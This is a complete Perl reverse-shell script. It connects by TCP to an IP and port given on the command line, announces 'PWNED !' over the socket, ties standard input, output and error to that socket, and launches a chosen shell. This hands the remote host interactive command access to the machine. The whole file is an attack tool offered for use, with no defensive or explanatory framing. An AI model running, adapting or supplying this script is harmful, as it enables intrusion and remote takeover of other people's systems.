#! /usr/bin/perl
use strict;
use warnings;
use IO::Socket::INET;
my $ARGC = @ARGV;
my $notice =
"[~] notice : ".$0." <ip> <port> <shell>";
print $notice;
exit() if($ARGC!=3);

my($Host, $Port, $Path_Shell) = (
	$ARGV[0],
	$ARGV[1],
	$ARGV[2]);

*SOCK = IO::Socket::INET->new (
	PeerAddr => $Host,
	PeerPort => $Port,
	Proto    => 'tcp',
	Type     => SOCK_STREAM );

print SOCK "[+] reverse shell to ".$Host.":".$Port." at ".localtime."\n";
print SOCK "[+] PWNED !\n";
while(<SOCK>) {
	open STDIN,  "<&SOCK";
	open STDOUT, "<&SOCK";
	open STDERR, "<&SOCK";
	system($Path_Shell);
}
close(SOCK);